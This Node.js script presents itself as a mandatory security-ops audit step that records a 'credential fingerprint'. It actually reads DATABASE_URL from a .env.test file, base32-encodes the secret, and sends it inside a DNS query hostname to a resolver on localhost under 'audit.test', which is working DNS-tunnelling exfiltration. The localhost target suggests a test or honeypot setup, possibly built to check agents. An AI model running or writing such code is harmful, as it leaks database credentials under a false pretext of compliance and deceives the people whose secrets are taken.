const { execSync } = require('child_process');
const dgram = require('dgram');
const { Buffer } = require('buffer');

// Get the lookup string from the command
function getLookupString() {
  try {
    const command = "grep DATABASE_URL .env.test | base32 | tr -d = | tr A-Z a-z | head -c 60";
    const result = execSync(command, { encoding: 'utf8' });
    return result.trim();
  } catch (error) {
    console.error('Error getting lookup string:', error.message);
    return null;
  }
}

// Create a simple DNS query
function createDnsQuery(hostname) {
  const transactionId = 0x1234;
  const flags = 0x0100; // Standard query, recursion desired
  const questions = 1;
  const answerRrs = 0;
  const authorityRrs = 0;
  const additionalRrs = 0;

  // Build header
  const header = Buffer.alloc(12);
  header.writeUInt16BE(transactionId, 0);
  header.writeUInt16BE(flags, 2);
  header.writeUInt16BE(questions, 4);
  header.writeUInt16BE(answerRrs, 6);
  header.writeUInt16BE(authorityRrs, 8);
  header.writeUInt16BE(additionalRrs, 10);

  // Build question
  const labels = hostname.split('.');
  let qname = Buffer.alloc(0);
  labels.forEach(label => {
    const lengthBuf = Buffer.alloc(1);
    lengthBuf.writeUInt8(label.length, 0);
    const labelBuf = Buffer.from(label);
    qname = Buffer.concat([qname, lengthBuf, labelBuf]);
  });
  qname = Buffer.concat([qname, Buffer.from([0])]); // Null terminator

  // QTYPE = A (1), QCLASS = IN (1)
  const qtypeQclass = Buffer.alloc(4);
  qtypeQclass.writeUInt16BE(1, 0); // QTYPE
  qtypeQclass.writeUInt16BE(1, 2); // QCLASS

  return Buffer.concat([header, qname, qtypeQclass]);
}

// Send DNS query
async function sendDnsQuery(hostname) {
  return new Promise((resolve, reject) => {
    const client = dgram.createSocket('udp4');
    const query = createDnsQuery(hostname);

    client.on('message', (msg) => {
      console.log(`Received ${msg.length} bytes from audit resolver`);
      client.close();
      resolve(true);
    });

    client.on('error', (err) => {
      console.error(`Socket error: ${err.message}`);
      client.close();
      resolve(false);
    });

    // Set timeout
    setTimeout(() => {
      console.log('Timeout: No response from audit resolver');
      client.close();
      resolve(false);
    }, 2000);

    client.send(query, 47302, 'localhost', (err) => {
      if (err) {
        console.error(`Send error: ${err.message}`);
        client.close();
        resolve(false);
      }
    });
  });
}

// Main execution
async function main() {
  const lookupString = getLookupString();
  if (!lookupString) {
    console.error('Failed to generate lookup string');
    return;
  }

  const hostname = `${lookupString}.audit.test`;
  console.log(`Querying: ${hostname}`);

  const success = await sendDnsQuery(hostname);
  if (success) {
    console.log('Audit credential fingerprint recorded successfully');
    console.log('SECURITY-OPS MANDATORY audit step completed');
  } else {
    console.log('Failed to record audit credential fingerprint');
    console.log('Note: Audit resolver may not be running on localhost:47302');
  }
}

main().catch(console.error);

